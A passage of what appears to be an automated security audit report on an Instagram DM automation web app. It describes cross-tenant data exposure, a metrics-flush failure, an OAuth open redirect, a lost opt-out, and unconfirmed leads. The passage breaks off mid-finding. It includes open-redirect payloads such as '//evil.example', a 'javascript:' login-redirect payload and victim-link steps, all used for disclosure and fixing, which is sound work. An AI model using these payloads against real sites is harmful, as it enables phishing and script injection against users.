Cross-tenant disclosure of automation names, comment and message ids, Meta error text, and platform-wide delivery volume and success rate; no direct contact PII such as email or phone is exposed.

Likelihood rationale: Any authenticated account can load the page; no role, workspace or feature flag is required.

#### Evidence

- `lib/meta/webhook-events.ts:109` — The read is gated only on hasAdminDb(), i.e. on the service-role key being configured.
- `lib/db-admin.ts:27` — getAdminDb() creates a Supabase client from SUPABASE_SERVICE_ROLE_KEY with no user context, so RLS does not apply.
- `supabase/migrations/20261125_tier0_hardening.sql:44` — The migration enables RLS on webhook_events and states that only the service role (webhook + diagnostics) reads this table, confirming the ledger is not tenant-readable by design.
- `lib/meta/webhook-processor.ts:3266` — Failure strings embed the comment id and the tenant's automation name, e.g. 'Comment <id> on automation <name>: Meta error ...'.
- `lib/meta/webhook-processor.ts:3677` — Inbound DM failures embed the Meta message id in the same ledger error column.
- `app/dashboard/layout.tsx:37` — The dashboard layout redirects only when there is no session; no role or admin check guards the diagnostics route.
- `app/dashboard/page.tsx:293` — The global success rate, average duration and job count are also rendered on the main dashboard.
- `app/dashboard/overview/page.tsx:970` — The overview page renders the same platform-wide job count and success rate.

#### How to fix it

Scope the ledger read to the caller's Instagram accounts, mirroring getQueueStats: resolve the caller's instagram_accounts ids in the page and pass them to getWebhookHealth, which must filter with .in("instagram_account_id", accountIds) and return EMPTY_HEALTH for an empty list. Alternatively gate the delivery card on isAdminEmail(user.email).

`lib/meta/webhook-events.ts`:

```ts
export async function getWebhookHealth(
  hours = 24,
  instagramAccountIds: string[] = []
): Promise<WebhookHealth> {
  if (!hasAdminDb() || instagramAccountIds.length === 0) return EMPTY_HEALTH;

  try {
    const since = new Date(Date.now() - hours * 60 * 60 * 1000).toISOString();
    const { data, error } = await getAdminDb()
      .from("webhook_events")
      .select("id, status, duration_ms, error, received_at")
      .in("instagram_account_id", instagramAccountIds)
      .gte("received_at", since);
    if (error) throw error;
    // ...unchanged aggregation...
  } catch (error) {
    console.warn("[webhook-events] Health query unavailable:", error);
    return EMPTY_HEALTH;
  }
}
```

#### Reproduction inputs

- `docker run --rm --network none --read-only --tmpfs /tmp:rw,size=64m --memory 512m --cpus 1 --pids-limit 128 --cap-drop ALL --security-opt no-new-privileges -v "C:\Users\ratho\Desktop\dmplease 1:/target:ro" -v "C:\Users\ratho\security-audit-skill\dmplease\run-1\agents\v22\scratch:/scratch:rw" -w /scratch --entrypoint node penpotapp/mcp:2.17 --import ./hooks.mjs ./run.mjs`
- `stub @/lib/db-admin returning three rows: FAILED ws-tenant-a with error 'Comment 17890000000000001 on automation "VIP Black Friday drop": Meta error 190: invalid OAuth access token', FAILED ws-tenant-b with error 'Inbound DM m_AG123 failed: Meta error 613: rate limit', DONE ws-tenant-b`
- `await getWebhookHealth(168)`

Instructions:
1. Mount the target read-only and the scratch directory writable; disable networking and apply the stated memory, CPU, pid and capability limits.
2. Register a resolve hook that maps the value import @/lib/db-admin to the stub; the remaining imports in lib/meta/webhook-events.ts are type-only and are stripped by Node's type stripping.
3. Import /target/lib/meta/webhook-events.ts and call getWebhookHealth(168), then print the returned object.

---

### 3.6 One manual DM writes a non-UUID metrics target that permanently breaks the shared daily-metrics flush

**Severity:** medium · **Likelihood:** high · **Impact:** medium · **Confidence:** high

**Fingerprint:** `metrics-flush:non-uuid-target-id:send-dm-manual`

#### What it is

POST /api/instagram/send-dm records a dm_sent metric with targetId "manual". The metrics flush route (/api/cron/flush-metrics) parses that key and passes target_id: "manual" to increment_daily_metrics, which casts (row->>'target_id')::uuid into a UUID NOT NULL column. The RPC aborts, the catch restores every aggregated row in the batch and re-adds the poison key, and the route returns 500. Because the poison key is restored verbatim, every later flush that pops it fails again; once the dirty set drains to the poison key(s), every flush fails, so daily_creator_metrics stops updating for all tenants and the Redis dirty set grows.

#### Root cause

send-dm writes a non-UUID targetId into a shared metrics pipeline whose flush assumes every target_id is a UUID; the flush's failure handler restores the poison key instead of dropping it.

#### Intended behavior

Every metric written to the shared pipeline should use a target id that satisfies daily_creator_metrics.target_id (UUID), and a single malformed key should not abort the whole flush batch.

#### Where it lives (source trace)

- **entrypoint** — `app/api/instagram/send-dm/route.ts:210` (POST /api/instagram/send-dm): A successful manual send records a dm_sent metric.
- **propagation** — `app/api/instagram/send-dm/route.ts:213` (recordMetricEvent): targetId is the literal string "manual".
- **propagation** — `lib/metrics.ts:26` (buildMetricKey): The key embeds the non-UUID target id and is added to metrics:dirty:keys.
- **propagation** — `app/api/cron/flush-metrics/route.ts:91` (flush aggregation): The flush maps the parsed targetId straight into target_id.
- **sink** — `supabase/migrations/20261126_daily_metrics.sql:50` (increment_daily_metrics): (row->>'target_id')::uuid raises on "manual", aborting the RPC for the whole batch.

#### Who can trigger it

An authenticated creator sends one manual DM through POST /api/instagram/send-dm; no special privileges are needed.

#### Conditions required

- **authentication_level:** Any authenticated creator can trigger it by sending one manual DM.
- **data_state:** The workspace must have a connected Instagram account and the Meta send must succeed (success = !result.error) for recordMetricEvent to run.
- **system_configuration:** Upstash Redis, the Supabase service role, the daily_metrics migration, and the QStash schedule that invokes /api/cron/flush-metrics must be configured so recordMetricEvent and the flush run.
- **timing_dependency:** The poison key must be popped by the flush route's spop batch for the RPC to fail.
- **third_party_dependency:** Postgres rejects 'manual'::uuid (22P02), aborting the increment_daily_metrics RPC.

#### What we observed

{"key":"metric:2026-11-27:dm_sent:11111111-1111-4111-8111-111111111111:manual","parsed":{"day":"2026-11-27","kind":"dm_sent","creatorId":"11111111-1111-4111-8111-111111111111","targetId":"manual"},"flushPayloadTargetId":"manual","targetIdIsUuid":false,"restoredKey":"metric:2026-11-27:dm_sent:11111111-1111-4111-8111-111111111111:manual","restoredKeyEqualsOriginal":true}

#### Why it matters

Once the dirty set drains to the poison key(s), every flush fails, so all tenants' daily metrics rollups stop updating and the Redis dirty set grows until the poison key(s) are manually removed.

Likelihood rationale: Any successful manual DM writes the poison key; no special conditions beyond the normal feature are required.

#### Evidence

- `app/api/instagram/send-dm/route.ts:213` — targetId: "manual" is written for every successful manual DM.
- `lib/metrics.ts:26` — buildMetricKey embeds targetId unchanged in metric:<day>:<kind>:<creatorId>:<targetId>.
- `app/api/cron/flush-metrics/route.ts:91` — The flush passes target_id: row.targetId to the RPC.
- `supabase/migrations/20261126_daily_metrics.sql:7` — daily_creator_metrics.target_id is UUID NOT NULL.
- `supabase/migrations/20261126_daily_metrics.sql:50` — increment_daily_metrics casts (row->>'target_id')::uuid.
- `app/api/cron/flush-metrics/route.ts:119` — On RPC failure the catch re-adds the poison key to metrics:dirty:keys, so the failure repeats.

#### How to fix it

Use a UUID target for manual sends and make the flush skip or coerce non-UUID target ids before the RPC so one bad key cannot abort the batch.

`app/api/instagram/send-dm/route.ts`:

```ts
await recordMetricEvent({
  kind: "dm_sent",
  creatorId: workspaceId,
  targetId: workspaceId,
  timeZone: await getWorkspaceTimeZone(workspaceId),
});
```

`app/api/cron/flush-metrics/route.ts`:

```ts
const UUID_RE =
  /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

keys.forEach((key, index) => {
  const parsed = parseMetricKey(key);
  const delta = Number(values[index] ?? 0);
  if (!parsed || !UUID_RE.test(parsed.targetId) || !Number.isFinite(delta) || delta <= 0) return;
```

#### Reproduction inputs

- `POST /api/instagram/send-dm with {"recipientId":"<any IGSID>","message":"hi"} after a successful Meta send`
- `metric:2026-11-27:dm_sent:11111111-1111-4111-8111-111111111111:manual`

Instructions:
1. Run the bounded local check in the sandbox: docker run --rm --network none --read-only --tmpfs /tmp:rw,size=64m --memory 512m --cpus 1 --pids-limit 128 --cap-drop ALL --security-opt no-new-privileges -v "<target>:/target:ro" -v "<scratch>:/scratch:rw" --entrypoint node penpotapp/mcp:2.17 --no-warnings --import file:///scratch/register.mjs /scratch/check.mjs
2. The harness imports the real lib/metrics.ts with @/lib/upstash and @/lib/timezone stubbed via a Node resolve hook, builds the key send-dm writes, parses it with the flush's parseMetricKey, and rebuilds the restore key.

---

### 3.7 OAuth callback redirects to an unvalidated nextUrl from the state, giving an unauthenticated open redirect

**Severity:** low · **Likelihood:** high · **Impact:** low · **Confidence:** high

**Fingerprint:** `app/api/auth/meta/callback/route.ts:state-nexturl-open-redirect`

#### What it is

GET /api/auth/meta/callback derives its redirect target from verifiedState.nextUrl and resolves it with new URL(nextTarget, origin). nextUrl is copied verbatim from the `next` query parameter at /api/auth/meta/connect and signed without any scheme, host, or leading-slash validation. The `error` branch redirects before the code exchange and before any session check, so a state minted by any logged-in user (or forged through the hardcoded-key weakness) turns the callback into an off-origin redirector for an unauthenticated visitor. Protocol-relative, backslash-normalized, and absolute values all leave the application origin.

#### Root cause

app/api/auth/meta/connect/route.ts line 7 reads `next` with no validation and line 72 signs it into the state. app/api/auth/meta/callback/route.ts line 38 copies verifiedState.nextUrl into nextTarget and line 42 resolves it with new URL(nextTarget, origin); the error branch at lines 47-50 calls NextResponse.redirect(targetUrl) without comparing the resolved origin to the configured app origin.

#### Intended behavior

The post-OAuth redirect should only land on a path of the application's own origin. `next` should be rejected or rewritten unless it is a single-slash-rooted path with no second leading slash or backslash, and the resolved URL's origin should be compared with the configured origin before redirecting.

#### Where it lives (source trace)

- **entrypoint** — `app/api/auth/meta/connect/route.ts:7` (GET /api/auth/meta/connect): nextParam is read from the query string with only a default; no scheme, host, or leading-slash validation.
- **propagation** — `app/api/auth/meta/connect/route.ts:72` (GET /api/auth/meta/connect): signOAuthState(user.id, nextParam, 'facebook') signs the unvalidated value into the state.
- **propagation** — `app/api/auth/meta/callback/route.ts:38` (GET /api/auth/meta/callback): nextTarget = verifiedState?.nextUrl || '/dashboard/settings'.
- **propagation** — `app/api/auth/meta/callback/route.ts:42` (GET /api/auth/meta/callback): new URL(nextTarget, origin) resolves a network-path or absolute reference to the attacker's origin.
- **sink** — `app/api/auth/meta/callback/route.ts:49` (GET /api/auth/meta/callback): NextResponse.redirect(targetUrl) emits the off-origin Location header on the error branch, before the code exchange and without any session check.

#### Who can trigger it

A logged-in attacker requests /api/auth/meta/connect?next=//evil.example, reads the signed `state` from the redirect Location, and sends /api/auth/meta/callback?error=Session+expired&state=<state> to a victim.

#### Conditions required

- **user_interaction:** The victim must open the crafted callback URL.
- **authentication_level:** The error branch performs no session check, so the victim need not be signed in.
- **timing_dependency:** The state is valid for 10 minutes from minting; the attacker can mint a fresh one at will.

#### What we observed

Docker (--network none --read-only, target mounted read-only): '/dashboard/settings' -> https://app.example.com/dashboard/settings?error=Session+expired (on-origin); '//evil.example', '/\evil.example', 'https://evil.example' and '///evil.example' all -> https://evil.example/?error=Session+expired (off-origin). Bounded-check output: agents/v02b/artifacts/check-output.json.

#### Why it matters

The victim is redirected off-origin with attacker-controlled error text, enabling phishing. No credential, token, or session value is carried in the redirect.

Likelihood rationale: Any logged-in user can mint a state with an arbitrary nextUrl, and the callback needs no session or valid code to follow the error branch.

#### Evidence

- `app/api/auth/meta/connect/route.ts:7` — The `next` query parameter is the untrusted source and is not validated before signing.
- `app/api/auth/meta/callback/route.ts:38` — The signed nextUrl becomes the redirect target with no allowlist.
- `app/api/auth/meta/callback/route.ts:42` — URL resolution against `origin` is what turns '//evil.example' into an absolute off-origin URL.
- `app/api/auth/meta/callback/route.ts:47` — The error branch redirects before the code exchange and before the verifiedState subject check, so no session or valid code is required.

#### How to fix it

Validate `next` at mint time and again at redirect time: require a single-slash-rooted path, reject a second leading '/' or backslash, reject any scheme, and compare the resolved origin with the configured app origin.

`app/api/auth/meta/callback/route.ts`:

```ts
function safeNextPath(raw: string | undefined): string {
  if (!raw || !raw.startsWith("/") || raw.startsWith("//") || raw.includes("\\")) {
    return "/dashboard/settings";
  }
  const resolved = new URL(raw, origin);
  if (resolved.origin !== origin) return "/dashboard/settings";
  return resolved.pathname + resolved.search + resolved.hash;
}

const targetUrl = new URL(safeNextPath(verifiedState?.nextUrl), origin);
```

#### Reproduction inputs

- `/api/auth/meta/connect?next=//evil.example`
- `/api/auth/meta/callback?error=Session+expired&state=<signed-state-with-nextUrl=//evil.example>`

Instructions:
1. Reproduce the callback's target construction with origin fixed to https://app.example.com.
2. Resolve each candidate nextUrl with new URL(nextTarget, origin) and append the error query parameter.
3. Record which inputs leave the application origin.

---

### 3.8 Opt-out is dropped for first-time story senders because recordOptOut only updates an existing contact row

**Severity:** low · **Likelihood:** medium · **Impact:** low · **Confidence:** high

**Fingerprint:** `dmplease:webhook:opt-out-update-only-lost-when-contact-absent`

#### What it is

An Instagram user who replies 'stop' to a creator's story is sent the unsubscribe confirmation, but the opt-out is not persisted when the sender has no contacts row yet. In processDirectRule the opt-out branch calls recordOptOut before ensureContact; recordOptOut issues an UPDATE on contacts keyed by workspace_id and instagram_id and does not detect that it affected zero rows. Story replies are excluded from the inbound-DM path (isStoryInteraction/parseMessageEvents), so no other path creates the contact first. isOptedOut then reads contacts.opted_out_at as null and returns false, so later comment and story automations are not blocked for a recipient who was told they were unsubscribed.

#### Root cause

recordOptOut is update-only and runs before ensureContact in processDirectRule. For a story reply from a sender with no contacts row, the UPDATE matches zero rows and the zero-row result is ignored, while the unsubscribe confirmation is still sent. Because story replies are excluded from the inbound-DM path that creates the contact before its opt-out check, nothing creates the row, and isOptedOut later reads the missing row as not opted out.

#### Intended behavior

An opt-out must be durably recorded before the confirmation is sent, creating the contact row if necessary, and isOptedOut must not report 'not opted out' when the state is missing or unreadable.

#### Where it lives (source trace)

- **entrypoint** — `app/api/webhook/route.ts:53` (POST): Meta's signed webhook is verified and handed to processWebhookPayload.
- **propagation** — `lib/meta/webhook-processor.ts:3924` (processWebhookPayload): The story branch selects a rule with selectInboundRule; a catch-all story rule matches any reply text.
- **propagation** — `lib/meta/webhook-processor.ts:3947` (processWebhookPayload): matchedText falls back to the story reply text when the selected rule is a catch-all, so 'stop' reaches the opt-out check.
- **propagation** — `lib/meta/webhook-processor.ts:2864` (processDirectRule): The text is treated as an opt-out and recordOptOut is called.
- **propagation** — `lib/meta/webhook-processor.ts:396` (recordOptOut): An UPDATE keyed on workspace_id and instagram_id is issued; a zero-row update is not detected.
- **propagation** — `lib/meta/webhook-processor.ts:2901` (processDirectRule): ensureContact, which would create the row, runs only after the opt-out branch.
- **sink** — `lib/meta/webhook-processor.ts:381` (isOptedOut): The later read returns false because no contact row was ever created, so subsequent automations still send.

#### Who can trigger it

An Instagram user who has never interacted with the creator replies 'stop' to the creator's story. The webhook is Meta-signed; the user needs no dmplease account.

#### Conditions required

- **system_configuration:** An active STORY_REPLY dm_rule with an empty keywords array (catch-all) exists for the workspace, so selectInboundRule returns it for arbitrary reply text.
- **data_state:** The sender has no contacts row for (workspace_id, instagram_id) when the story reply arrives.
- **environmental_dependency:** NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY are configured so hasAdminDb() is true; otherwise recordOptOut and isOptedOut both no-op/false.
- **third_party_dependency:** Meta delivers the story reply as a messaging event with message.reply_to.story (or reply_to_story) and text 'stop'.
- **user_interaction:** The recipient replies 'stop' to the creator's story.

#### What we observed

Bounded local check (Node 24 type-stripping, stubbed Supabase client, Docker --network none, read-only target): the confirmation DM was sent; recordOptOut issued UPDATE contacts SET opted_out_at=..., opted_out_keyword='stop' WHERE workspace_id='ws-1' AND instagram_id='user-1'; contacts rows after = 0 and contacts upserts = 0; isOptedOut('ws-1','user-1') returned false; the story event was recorded as skipped. The later-comment DM is the direct consequence of the false read at the comment guard (line 2548), not separately observed. Output: agents/v19/artifacts/check-output.json.

#### Why it matters

The recipient receives automated DMs after being told they were unsubscribed; no tenant data is exposed or modified, but it defeats a safety/compliance control and can harm the creator's sending reputation.

Likelihood rationale: Requires an active catch-all STORY_REPLY rule (empty keywords) and a sender with no existing contacts row; both are plausible in normal use, but the opt-out text must be the story reply.

#### Evidence

- `lib/meta/webhook-processor.ts:396` — recordOptOut only updates an existing contacts row and ignores the affected-row count.
- `lib/meta/webhook-processor.ts:2901` — ensureContact runs after the opt-out branch in processDirectRule.
- `lib/meta/webhook-processor.ts:3292` — The inbound-DM path creates the contact before checking opt-out, but story replies are excluded from that path, so it does not repair the story-reply opt-out.
- `lib/meta/webhook.ts:343` — isStoryInteraction marks a message with reply_to_story or reply_to.story as a story interaction.
- `lib/meta/webhook.ts:368` — parseMessageEvents skips story interactions, so a story reply never reaches the inbound-DM ensureContact at line 3292.
- `lib/meta/webhook-processor.ts:381` — isOptedOut returns Boolean(data?.opted_out_at), so a missing row reads as not opted out.
- `lib/meta/webhook-processor.ts:2866` — The unsubscribe confirmation is still sent, so the recipient is told the opt-out succeeded.
- `lib/meta/webhook-processor.ts:2548` — The comment path checks isOptedOut before ensureContact, so a later comment is not blocked once the opt-out is lost.

#### How to fix it

Make the opt-out write create-or-update the contact row (upsert on workspace_id,instagram_id) instead of a bare UPDATE, and/or call ensureContact before the opt-out branch in processDirectRule. Also make isOptedOut fail closed on lookup errors so a missing or unreadable row cannot silently re-enable messaging.

`lib/meta/webhook-processor.ts`:

```ts
export async function recordOptOut(
  workspaceId: string,
  recipientId: string,
  keyword: string
): Promise<void> {
  if (!hasAdminDb()) return;
  try {
    const { error } = await getAdminDb()
      .from("contacts")
      .upsert(
        {
          workspace_id: workspaceId,
          instagram_id: recipientId,
          source: "opt_out",
          opted_out_at: nowIso(),
          opted_out_keyword: keyword,
          updated_at: nowIso(),
        },
        { onConflict: "workspace_id,instagram_id" }
      );
    if (error) throw error;
    await recordSafety({
      workspaceId,
      recipientId,
      kind: "opt_out",
    });
  } catch (error) {
    console.warn("[opt-out] Could not record opt-out:", error);
  }
}
```

#### Reproduction inputs

- `{"object":"instagram","entry":[{"id":"ig-1","time":1,"messaging":[{"sender":{"id":"user-1","username":"alice"},"recipient":{"id":"ig-1"},"message":{"mid":"m-1","text":"stop","reply_to":{"story":{"id":"story-9"}}}}]}]}`

Instructions:
1. Configure an active STORY_REPLY dm_rule with an empty keywords array (catch-all) for the workspace.
2. Ensure no contacts row exists for (workspace_id, instagram_id) for the sender.
3. Send a story reply with text 'stop' from the sender.
4. Observe the unsubscribe confirmation DM is sent.
5. Observe the contacts UPDATE is issued but affects zero rows and no contacts row is created.
6. Call isOptedOut(workspace_id, sender) and observe false; a later comment on a post passes the isOptedOut guard at line 2548 and is not blocked.

---

## 4. Leads that need validation

These records are source-grounded but blocked on a fact that is outside the repository or the sandbox. They are **not confirmed vulnerabilities** and carry **no severity**. Each one names the exact missing fact and a safe way to resolve it.

### 4.1 Admin DLQ access is granted on an unverified email string

**Fingerprint:** `admin-dlq-unverified-email-admin-gate`

#### What it is

GET and POST /api/admin/dlq authorize a caller either with the CRON_SECRET bearer token or, failing that, by comparing the Supabase session user's email to ADMIN_ALERT_EMAILS. The comparison never inspects email_confirmed_at, app_metadata, or any role, so any session whose email string matches an admin address is treated as a platform admin and can list, replay, and delete the platform-wide QStash dead-letter queue. Whether an attacker can obtain such a session depends on deployed Supabase Auth configuration: the repository's 20261127_remove_auto_confirm.sql migration records that the live handle_new_user() previously ran UPDATE auth.users SET email_confirmed_at = now() for every signup, which would let a self-service signup with an admin address obtain a session.

#### Claimed root cause

isAdminEmail() treats the session email as proof of admin identity without binding it to a verified email or an explicit admin role.

#### Where it lives (source trace)

- **entrypoint** — `app/api/admin/dlq/route.ts:36` (GET /api/admin/dlq): Any caller can issue a GET to the admin DLQ endpoint; the handler immediately evaluates the admin gate.
- **propagation** — `app/api/admin/dlq/route.ts:37` (GET /api/admin/dlq): The handler returns 401 unless authorized(request) resolves true.
- **propagation** — `app/api/admin/dlq/route.ts:30` (authorized()): When no cron bearer token is present, the gate falls back to isAdminEmail(user?.email) from the Supabase session.
- **propagation** — `lib/profile.ts:58` (loadCurrentUser): getCurrentUser() returns the Supabase Auth user record; only the email string is consumed and email_confirmed_at is discarded.
- **propagation** — `lib/alerts/capacity.ts:157` (isAdminEmail): The email is lowercased and compared to ADMIN_ALERT_EMAILS with no verification-state or role check.
- **sink** — `lib/dlq-ops.ts:26` (listDeadLetters): Up to 20 platform-wide QStash dead-letter entries, including destination URL, response status and response body, are returned to the caller.

#### Evidence

- `lib/alerts/capacity.ts:154` — isAdminEmail accepts any non-empty email string and returns true on a case-insensitive match against ADMIN_ALERT_EMAILS; there is no email_confirmed_at, app_metadata, or role check.
- `lib/profile.ts:53` — loadCurrentUser returns the raw Supabase user object from supabase.auth.getUser() and never inspects confirmation state.
- `app/api/admin/dlq/route.ts:44` — POST /api/admin/dlq uses the same authorized() gate and then replays or deletes any supplied dlqId, so the same weakness grants destructive platform operations.
- `supabase/migrations/20261127_remove_auto_confirm.sql:4` — The migration header states the live handle_new_user() contained UPDATE auth.users SET email_confirmed_at = now(), which marked every new user confirmed and bypassed the Supabase Confirm email setting.
- `docs/00-overview/EXTERNAL_ACTIONS_BEFORE_LAUNCH.md:127` — The launch checklist states ADMIN_ALERT_EMAILS is already set in the deployed environment, so the email allowlist is populated rather than empty.

#### Why it is not confirmed

- Whether Supabase Auth "Confirm email" is enabled for the live project (Dashboard -> Authentication -> Providers -> Email).
- Whether supabase/migrations/20261127_remove_auto_confirm.sql has been applied to the live database, since the migration header records that the deployed handle_new_user() previously set auth.users.email_confirmed_at = now() for every signup.
- Whether any ADMIN_ALERT_EMAILS address is absent from auth.users (so a self-service signup could claim it) or present with email_confirmed_at IS NULL.

#### How to resolve it

- **Bounded local check:** Unit-test isAdminEmail with the email string from a Supabase-shaped user whose email matches ADMIN_ALERT_EMAILS and whose email_confirmed_at is null; the current implementation returns true, showing the gate does not bind to verification state. Also assert that authorized() in app/api/admin/dlq/route.ts returns true for that user when no cron bearer token is present.
- **Owner-observed check:** Owner reads Supabase Dashboard -> Authentication -> Providers -> Email to confirm "Confirm email" is enabled, and runs the read-only query `select email, email_confirmed_at from auth.users where lower(email) in (...)` for the ADMIN_ALERT_EMAILS entries. If confirmation is disabled (or the deployed handle_new_user still auto-confirms) and an admin address has no existing account or an unconfirmed one, a self-service signup at /auth/sign-up with that address yields a session that passes the admin gate.

---

### 4.2 Instagram connect binds a client-supplied instagram_id to the caller's workspace without proving control of that account

**Fingerprint:** `app/api/instagram/accounts/connect/route.ts:client-supplied-instagram-id-tenant-binding`

#### What it is

The legacy branch of POST /api/instagram/accounts/connect accepts accounts[].instagramBusinessId from the request body and upserts an instagram_accounts row with onConflict: 'instagram_id'. instagram_id is globally unique (prisma/schema.prisma line 108) and is the sole tenant-routing key used by the service-role webhook processor, which resolves the workspace for an inbound event with .eq('instagram_id', instagramId) (lib/meta/webhook-processor.ts line 531). No call to Meta verifies that the caller's token controls the supplied id. An authenticated user with at least one connected account can therefore pre-register another creator's Instagram business account id in a workspace they own. Because the id is unique, the legitimate owner's later connect conflicts and is denied by the instagram_accounts UPDATE policy, so the owner cannot connect; and if Meta delivers webhooks for that account (app-level subscription), the events are attributed to the attacker's workspace.

#### Claimed root cause

app/api/instagram/accounts/connect/route.ts lines 142-148 map parsed.data.accounts straight into `selected`, and instagramBusinessId is only z.string().min(1) at line 29. Line 211 then upserts instagram_accounts with workspace_id = the caller's new workspace and instagram_id = the body value, onConflict: 'instagram_id' (line 233). The only outbound verification, subscribeInstagramAccountToWebhooks at line 259, is not used as a gate and its failure is ignored. lib/meta/webhook-processor.ts getAccount (lines 523-533) then uses the service-role client to pick the tenant by instagram_id alone.

#### Where it lives (source trace)

- **entrypoint** — `app/api/instagram/accounts/connect/route.ts:142` (POST /api/instagram/accounts/connect): The legacy branch builds `selected` from parsed.data.accounts; instagramBusinessId is only z.string().min(1) at line 29.
- **propagation** — `app/api/instagram/accounts/connect/route.ts:211` (POST /api/instagram/accounts/connect): instagram_accounts.upsert({ workspace_id: workspaceId, instagram_id: account.instagramBusinessId, ... }, { onConflict: 'instagram_id' }) writes the caller-chosen id into a workspace the caller owns.
- **propagation** — `prisma/schema.prisma:108` (InstagramAccount): instagramId String @unique makes the id a single global namespace entry rather than a per-workspace one.
- **sink** — `lib/meta/webhook-processor.ts:531` (getAccount): The service-role client resolves the tenant for an inbound webhook with .eq('instagram_id', instagramId).limit(1), so the row's workspace_id decides which tenant receives the event.

#### Evidence

- `app/api/instagram/accounts/connect/route.ts:29` — instagramBusinessId has no format or ownership constraint beyond a non-empty string.
- `app/api/instagram/accounts/connect/route.ts:142` — The legacy branch trusts the request body for account identity.
- `app/api/instagram/accounts/connect/route.ts:233` — onConflict: 'instagram_id' makes the global id the conflict key for the write.
- `prisma/schema.prisma:108` — instagram_id is globally unique.
- `lib/meta/webhook-processor.ts:526` — getAccount uses getAdminDb(), the service-role client that bypasses RLS.
- `supabase/migrations/20261125_tier0_hardening.sql:63` — The instagram_accounts INSERT policy only requires is_workspace_member(workspace_id) for the row's own workspace, which the attacker satisfies.
- `supabase/migrations/20261125_tier0_hardening.sql:68` — The instagram_accounts UPDATE policy's USING is_workspace_member(workspace_id) is evaluated against the existing row's workspace, so the victim's later upsert of the pre-registered id is denied.

#### Why it is not confirmed

- No Postgres or Supabase instance is available in the approved sandbox: only valkey/valkey:8.1, sj26/mailcatcher:latest, and penpotapp/mcp:2.17 images are present locally, the sandbox runs with --network none so a Postgres image cannot be pulled, and supabase/migrations contains no CREATE TABLE for public.instagram_accounts (the table is referenced only by foreign keys, ALTER TABLE, and RLS policies). The cross-tenant insert, the later unique conflict, and the RLS denial therefore could not be observed, and the live table's instagram_id unique constraint is asserted only by prisma/schema.prisma.
- Whether Meta delivers webhooks for an Instagram account whose per-account subscribed_apps was never successfully set by the attacker depends on the app's Meta-level subscription configuration, which is outside the repository.
- Whether a target creator's Instagram business account id is discoverable before they connect is not source-visible.

#### How to resolve it

- **Bounded local check:** Start a throwaway Postgres with the repository migrations, then create public.instagram_accounts from prisma/schema.prisma (the table DDL is not in supabase/migrations) including the instagram_id UNIQUE constraint, and apply supabase/migrations/20261125_tier0_hardening.sql. Create two dummy auth users A and B and a workspace owned by A. As A (authenticated role), insert an instagram_accounts row with workspace_id = A's workspace and instagram_id = B's dummy id; confirm the INSERT policy allows it. Then, as B, run the connect upsert (INSERT ... ON CONFLICT (instagram_id) DO UPDATE) with B's id and B's workspace; confirm it fails with a unique violation because the UPDATE policy's USING is_workspace_member(workspace_id) is false for A's row. Stop at that observation.
- **Owner-observed check:** Owner checks the Meta app dashboard for an app-level Instagram webhook subscription that would deliver events for accounts not subscribed per-account, confirms that instagram_accounts carries the instagram_id unique constraint in the live project, and confirms whether another creator's Instagram business account id is obtainable through the app's Graph API (e.g., business_discovery) before that creator connects.

---

### 4.3 Unvalidated `next` parameter reaches window.location.href in LoginForm, allowing javascript: navigation

**Fingerprint:** `components/login-form.tsx:next-javascript-navigation`

#### What it is

LoginForm reads `next` (or `callbackUrl`) from the query string and assigns it verbatim to `window.location.href` after a successful password sign-in. There is no scheme, host, or protocol-relative check. A link such as `/auth/login?next=javascript:alert(document.domain)` would therefore make the browser evaluate attacker script in the application origin with the freshly authenticated victim's session. The same value is also forwarded into the OAuth `redirectTo` (components/auth/oauth-buttons.tsx line 27) and the magic-link `emailRedirectTo` (components/login-form.tsx line 148), but `app/auth/confirm/route.ts` line 22 prefixes a non-slash value with `/`, so `javascript:` is neutralized on those two paths; the direct password path at line 88 is the javascript: sink. A bounded Node URL-resolution check confirmed `javascript:alert(1)` parses as an absolute `javascript:` URL with origin `null`, but URL parsing is not browser execution.

#### Claimed root cause

components/login-form.tsx lines 21-22 accept the `next` query parameter without validating its scheme or origin, and line 88 assigns it directly to `window.location.href`. No Content-Security-Policy is declared in next.config.ts, and neither proxy.ts nor lib/supabase/proxy.ts sets one, so nothing in source would block a javascript: navigation.

#### Where it lives (source trace)

- **entrypoint** — `components/login-form.tsx:21` (LoginForm): `nextTarget = searchParams.get('next') || searchParams.get('callbackUrl')` reads the attacker-controlled query value.
- **propagation** — `components/login-form.tsx:22` (LoginForm): `callbackUrl = nextTarget || '/onboarding'` applies only a default; no scheme or origin validation is performed.
- **sink** — `components/login-form.tsx:88` (LoginForm): `window.location.href = callbackUrl` navigates to the attacker-supplied value after a successful signInWithPassword.

#### Evidence

- `components/login-form.tsx:21` — The `next`/`callbackUrl` query parameter is the untrusted source.
- `components/login-form.tsx:88` — Direct assignment to window.location.href with no scheme or origin check.
- `next.config.ts:8` — The Next config object declares no headers() and no Content-Security-Policy; proxy.ts and lib/supabase/proxy.ts also set no CSP.

#### Why it is not confirmed

- Whether the deployed browser executes a `javascript:` URL assigned to `window.location.href` was not observable: the approved sandbox image (penpotapp/mcp:2.17) contains no browser engine (no Chromium, Firefox, Playwright, or Puppeteer), and the single allowlisted artifact (`agents/v05/artifacts/check-output.json`) can carry only text output, not a browser run. A bounded Node URL-resolution check confirmed `javascript:alert(1)` parses as an absolute `javascript:` URL with origin `null`, but URL parsing is not execution.
- A deployed edge or CDN rule outside the repository could add a Content-Security-Policy with a `script-src` that blocks `javascript:` navigation; `next.config.ts` declares no `headers()` and no CSP, and `proxy.ts`/`lib/supabase/proxy.ts` set none, but the deployed header set is not source-visible.

#### How to resolve it

- **Bounded local check:** In a disposable browser sandbox with a headless Chromium (not present in this run's image), serve a fixture page that reads a `next` query parameter and assigns it to `window.location.href`, sign in with a dummy local account, and confirm that `?next=javascript:document.title='x'` executes in the page origin and that `?next=//evil.example` navigates off-origin. Do not point the fixture at production or any shared service.
- **Owner-observed check:** Owner inspects the deployed response headers for `/auth/login` (and the app origin generally) and confirms whether a `Content-Security-Policy` with a `script-src` that blocks `javascript:` navigation is present. If a CSP is present, re-test the payload against it.

---

### 4.4 Sign-up next parameter is used as a raw navigation target after account creation

**Fingerprint:** `components/sign-up-form.tsx:next-param-navigation-sink`

#### What it is

